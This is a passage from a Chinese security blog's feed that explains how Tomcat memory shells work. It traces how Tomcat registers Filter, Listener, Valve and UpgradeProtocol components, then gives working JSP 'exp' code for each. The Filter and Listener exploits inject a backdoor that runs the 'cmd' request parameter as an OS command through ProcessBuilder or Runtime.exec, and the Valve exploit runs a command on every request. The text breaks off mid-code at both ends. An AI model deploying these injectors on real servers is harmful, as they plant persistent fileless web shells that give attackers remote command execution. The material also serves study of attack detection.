class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-keyword">if</span> (request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/C&quot;</span>, request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>                <span class="hljs-comment">//将命令回显写入到response里面去</span><br>                response.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len));<br>                process.destroy();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">//去执行doFilter方法</span><br>            chain.doFilter(request,response);<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">// FilterDef</span><br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilterName(<span class="hljs-string">&quot;clown&quot;</span>);<br>    filterDef.setFilterClass(evilFilter.getClass().getName());<br>    <span class="hljs-comment">//这里估计也是在实例化filter的时候如果filterDef设置了就直接返回filter，因为调试的时候filterDef里面正常也是没有filter实例的</span><br>    filterDef.setFilter(evilFilter);<br>    <span class="hljs-comment">//添加FilterDef</span><br>    standardContext.addFilterDef(filterDef);<br><br>    <span class="hljs-comment">// FilterMap</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.setFilterName(<span class="hljs-string">&quot;clown&quot;</span>);<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    <span class="hljs-comment">//添加FilterMap</span><br>    standardContext.addFilterMapBefore(filterMap);<br><br>    <span class="hljs-comment">// 获取filterConfigs</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>    <span class="hljs-comment">//创建ApplicationFilterConfig</span><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<span class="hljs-comment">//将context和filterDef添加进去</span><br>    filterConfigs.put(<span class="hljs-string">&quot;clown&quot;</span>,filterConfig);<br><br>    out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br><br><br><br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409170203799.png" alt="image-20240917020309726"></p><p><img src="https://cdn.clown2024.cn/202409192246438.png" alt="image-20240919224412807"></p><p>成功！</p><blockquote><p>还有exp中的这行代码filterMap.setDispatcher(DispatcherType.REQUEST.name());</p><p>我搜了一下它是定义了过滤器可以介入的几种请求类型。这些类型包括：</p><ul><li><code>REQUEST</code>：普通的客户端请求。</li><li><code>FORWARD</code>：通过 <code>RequestDispatcher</code> 转发的请求。</li><li><code>INCLUDE</code>：通过 JSP 包含指令包含的资源。</li><li><code>ERROR</code>：作为错误页面请求。</li></ul><p>所以这行代码不是必须的，删掉也一样可以</p><p>而且这行代码只支持Tomcat 7.x 以上，因为javax.servlet.DispatcherType 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</p></blockquote><h1 id="listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h1><p>listener就是事件监听，java有很多中listener</p><p><img src="https://cdn.clown2024.cn/202409182314209.png" alt="image-20240918230547084"></p><p>大都是继承自EventListener接口，这里用ServletRequestListener，他有下面的两个方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.void requestInitialized(ServletRequestEvent sre)：<br>这个方法在 Servlet 请求对象被创建并且还没有被使用之前被调用。这通常发生在一个 HTTP 请求到达 Servlet 容器，并且容器决定为该请求创建一个新的 ServletRequest 对象时。这个方法可以用来初始化请求相关的资源，比如设置请求属性或者启动跟踪请求状态的逻辑。<br><br>2.void requestDestroyed(ServletRequestEvent sre)：<br>这个方法在 Servlet 请求对象即将被销毁时被调用。这通常发生在请求处理完成，响应已经发送给客户端之后。这个方法可以用来清理请求相关的资源，比如关闭数据库连接或者清理在 requestInitialized 方法中创建的任何对象。<br></code></pre></td></tr></table></figure><p>可以写一个简单的demo测试一下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servletshell;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListenerTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Listener 调用&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;servlet 离开&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>配置web.xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.clown.servletshell.ListenerTest<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>接下来就是照常分析一下Listener是怎么注册的了</p><p>这里直接从<strong>ContextConfig#configureContext</strong>那里开始分析，也就是访问前的过程</p><p>那就再去读取web.xml的那个地方看看</p><p><img src="https://cdn.clown2024.cn/202409191119893.png" alt="image-20240919111941724"></p><p>可以看到这里在添加filter之后就将listener的全类名进行添加，调用StandardContext#addApplicationListener方法</p><p>添加之后他会调用StandardContext#listenerStart</p><p><img src="https://cdn.clown2024.cn/202409191139786.png" alt="image-20240919113903688"></p><p>然后这里会查找我们添加的listener，到这步的代码比较复杂就不调了，有个数就行</p><p><strong>然后我们去访问网页</strong>，看一下请求过来时listener在哪里调用的</p><p><img src="https://cdn.clown2024.cn/202409191143445.png" alt="image-20240919114327349"></p><p>这里下个断点然后看看调用栈，看哪一个函数最重要</p><p><img src="https://cdn.clown2024.cn/202409191144058.png" alt="image-20240919114444926"></p><p>最重要的应该是这个函数StandardContext#fireRequestInitEvent</p><p>重新将断点下在这里看一看</p><p><img src="https://cdn.clown2024.cn/202409191151789.png" alt="image-20240919115146689"></p><p>可以看到它接受了request请求参数然后进行相关操作，然后这里获取一个listener数组</p><p>我们进该方法看看</p><p><img src="https://cdn.clown2024.cn/202409191155718.png" alt="image-20240919115507610"></p><p>可以看到applicationEventListenersList里面的就是我们的listener</p><p>而且StandardContext还有对应的添加listener的方法如下：</p><p><img src="https://cdn.clown2024.cn/202409191156621.png" alt="image-20240919115656529"></p><p>然后就是到下面遍历触发我们定义的listener的requestInitialized()方法</p><p><img src="https://cdn.clown2024.cn/202409191200195.png" alt="image-20240919120033087"></p><p>到这里流程就结束，这部分看起来还是比较简单的</p><p>相对应的请求结束的时候就会调用fireRequestDestroyEvent方法</p><p><img src="https://cdn.clown2024.cn/202409191232040.png" alt="image-20240919120248808"></p><h2 id="内存马编写"><a href="#内存马编写-1" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>通过上面的流程分析，exp的编写步骤也很简单：</p><p>就是通过 StandardContext 类的 <code>addApplicationEventListener()</code> 方法把恶意的 Listener实例放进去，然后恶意代码写在requestInitialized()方法里面即可</p><p>exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//获取standardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//创建恶意listener</span><br>    <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">servletRequestListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestListener</span>()&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br><br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//添加监听器</span><br>    standardContext.addApplicationEventListener(servletRequestListener);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>然后美美白屏弹计算器</p><p><img src="https://cdn.clown2024.cn/202409191342329.png" alt="image-20240919134253239"></p><p><img src="https://cdn.clown2024.cn/202409191342142.png" alt="image-20240919134258008"></p><blockquote><p>这里我认为是并没有相关路径的匹配逻辑，所以不需要在访问前的那部分注册</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里是本菜鸡开始学习内存马的起始文章&lt;/p&gt;
&lt;p&gt;有关内存马的认知可以看看su18师傅的这篇文章：&lt;a href=&quot;https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ&quot;&gt;https://mp.weixin.qq.com/s/</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="内存马" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat中间件内存马</title>
    <link href="https://clowsman.github.io/2024/09/14/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://clowsman.github.io/2024/09/14/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-09-14T12:54:29.000Z</published>
    <updated>2024-09-27T14:53:07.569Z</updated>
    
    <content type="html"><![CDATA[<p>其实前面的传统web应用内存马也是tomcat这部分的，因为它基于tomcat进行分析不过问题不大，别的中间件应该也是有这些基本组件的。</p><h1 id="tomcat-valve内存马"><a href="#Tomcat-Valve内存马" class="headerlink" title="Tomcat-Valve内存马"></a>Tomcat-Valve内存马</h1><p>valve就是前面文章中说过的阀门，也就是pipeline(管道)机制，想了解得更加细致一点可以看看这篇文章：<a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%89%8D%E6%96%87%E6%8F%90%E5%88%B0%E7%9A%84%E6%80%BB%E7%BB%93%E5%A4%A7%E5%85%A8%E6%96%87%E7%AB%A0%E3%80%82">https://www.cnblogs.com/coldridgeValley/p/5816414.html，也可以看前文提到的总结大全文章。</a></p><p>这里放一张Valve的运行机制图</p><p><img src="https://cdn.clown2024.cn/202409211418602.png" alt="image-20240921141822546"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>经过前面的学习，现在分析起来还是比较简单的，这里就不自己配一个valve了，因为valve属于容器，需要在server.xml或者context.xml那里配置，看看文章就行，或者像文章里直接用springboot来搭建。</p><blockquote><p>Pipeline定义对应的接口是Pipeline，他的实现类是StandardPipeline，Valve定义对应接口Valve，他的抽象实现类是ValveBase，然后四个容器本身有的阀门为StandardEngineValve，StandardHostValve，StandardContextValve，StandardWrapperValve。</p></blockquote><p>这里直接看源码分析</p><p><img src="https://cdn.clown2024.cn/202409211514128.png" alt="image-20240921151457990"></p><p>我们在访问filter的时候可以从调用栈看到很多的valve，我们可以去看一下这些wrapperValve</p><p><img src="https://cdn.clown2024.cn/202409211518432.png" alt="image-20240921151844389"></p><p>可以看到继承的是ValveBase这个类，这个类是一个抽象类，然后它又实现了Valve接口，看一下Valve接口有什么，直接copy一下文章的内容，因为他加了注释</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.catalina;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Request;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Response;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Valve</span> &#123;<br>    <span class="hljs-comment">// 获取下一个阀门</span><br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">// 设置下一个阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span>;<br>    <span class="hljs-comment">// 后台执行逻辑，主要在类加载上下文中使用到</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">// 执行业务逻辑</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException;<br>    <span class="hljs-comment">// 是否异步执行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们可以看一下每一级的Valve是怎么调用的</p><p><img src="https://cdn.clown2024.cn/202409211533484.png" alt="image-20240921153326414"></p><p>在Host调用Context的</p><p><img src="https://cdn.clown2024.cn/202409211533055.png" alt="image-20240921153355996"></p><p>在Context调用Wrapper的</p><p>然后我们重新下断点从context.getPipeline开始看，利用点从这里开始，因为我们好获取的就是context</p><p><img src="https://cdn.clown2024.cn/202409211538211.png" alt="image-20240921153810150"></p><p>这里会走到父类的ContainerBase的getPipeline方法，ContainerBase是所有容器的抽象父类</p><p><img src="https://cdn.clown2024.cn/202409211539334.png" alt="image-20240921153916289"></p><p>然后我们去看看这个pipeline</p><p><img src="https://cdn.clown2024.cn/202409211540918.png" alt="image-20240921154014879"></p><p>是一个StandardPipeline类，也就是我们前面说过的Pipeline的实现类</p><p><img src="https://cdn.clown2024.cn/202409211541679.png" alt="image-20240921154104632"></p><p>看看Pipeline的接口方法</p><p><img src="https://cdn.clown2024.cn/202409211541979.png" alt="image-20240921154142926"></p><p>可以看到有addVavle方法，那么StandardPipeline就有相应的实现方法</p><p><img src="https://cdn.clown2024.cn/202409211543271.png" alt="image-20240921154312200"></p><p>那我们打内存马的思路就出来了</p><p>我们只需要利用context.getPipeline然后addVavle进去一个我们自己写的恶意valve即可</p><h2 id="内存马编写"><a href="#内存马编写" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Valve&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//1.获取standardContext</span><br>    <span class="hljs-comment">//获取ApplicationContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>    <span class="hljs-comment">//获取StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//获取Pipeline</span><br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>    <span class="hljs-comment">//添加恶意Valve</span><br>    pipeline.addValve(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Valve</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-comment">//恶意代码</span><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>然后就能白屏弹计算器</p><p><img src="https://cdn.clown2024.cn/202409211550418.png" alt="image-20240921155025355"></p><p><img src="https://cdn.clown2024.cn/202409211550385.png" alt="image-20240921155045287"></p><p>在这篇文章看到一个更简单的获取standardContext的方法：<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 更简单的方法 获取StandardContext  </span><br> <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);  <br> reqF.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);  <br> <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext(); <br></code></pre></td></tr></table></figure><h1 id="tomcat-upgrade内存马"><a href="#Tomcat-Upgrade内存马" class="headerlink" title="Tomcat-Upgrade内存马"></a>Tomcat-Upgrade内存马</h1><h2 id="原理分析"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><p>这里参考文章：<a href="https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw">https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw</a></p><p>放一张文章的连接器图</p><p><img src="https://cdn.clown2024.cn/202409222103688.webp" alt="图片"></p><p>该内存马就是在到达Container之前的利用，因为可能会由于Filter的过滤或者反代导致我们找不到路径，导致我们的利用Container内组件的内存马无法使用</p><p>首先抽象类<strong>AbstractProcessorLight</strong>的process方法中，会根据当前<code>SocketWrapperBase</code>的状态进行响应，在<code>OPEN_READ</code>状态时，会调用对应的<code>Processor</code>的service方法进行处理</p><p><img src="https://cdn.clown2024.cn/202409222122170.png" alt="image-20240922212210064"></p><p>这里Http请求调用的就是Http11Processor#service，然后它里面有处理Upgrade的逻辑</p><p><img src="https://cdn.clown2024.cn/202409222127551.png" alt="image-20240922212744457"></p><p>这里的protocol是Http11NioProtocol，看一下他的getUpgradeProtocol方法</p><p><img src="https://cdn.clown2024.cn/202409222129320.png" alt="image-20240922212924262"></p><p>这里走到的是父类的方法，可以看到就是返回一个UpgradeProtocol，httUpgradeProtocols是一个hashMap；获取了upgradeProtocol之后，它下面还调用了他的accept方法</p><p>欸那这里内存马的思路就出来了，和之前的也很类似</p><p>首先这个UpgradeProtocol是一个接口</p><p><img src="https://cdn.clown2024.cn/202409222140816.png" alt="image-20240922214008767"></p><p>那么我们只要构造一个恶意的UpgradeProtocol的实现类，添加进我们前面的提到的httpUpgradeProtocols里面即可</p><p>那么现在就是要找这个httpUpgradeProtocols怎么获取，这里先跟文章看看httpUpgradeProtocols是哪里被赋值的</p><p><img src="https://cdn.clown2024.cn/202409222144324.png" alt="image-20240922214420260"></p><p>在AbstractHttp11Protocol#init方法里面对upgradeProtocols进行了遍历，然后调用了configureUpgradeProtocol方法</p><p><img src="https://cdn.clown2024.cn/202409222146364.png" alt="image-20240922214605304"></p><p>然后该方法upgradeProtocol添加到hashMap中</p><blockquote><p>upgradeProtocols是在tomcat启动的时候进行初始化</p></blockquote><h2 id="内存马编写"><a href="#内存马编写-1" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>第一步先找到Http11NioProtocol，我们可以在<strong>request.request.connector.protocolHandler</strong>中找到</p><p><img src="https://cdn.clown2024.cn/202409222151834.png" alt="image-20240922215129782"></p><p><img src="https://cdn.clown2024.cn/202409222151796.png" alt="image-20240922215134740"></p><p>然后httpUpgradeProtocols属性就在里面，我们需要用反射去获取，我看了一下没有直接get的方法</p><p>第二步就是编写恶意的UpgradeProtocol了</p><p><strong>exp</strong></p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Connector&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.http11.AbstractHttp11Protocol&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.UpgradeProtocol&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.HashMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Processor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Adapter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span 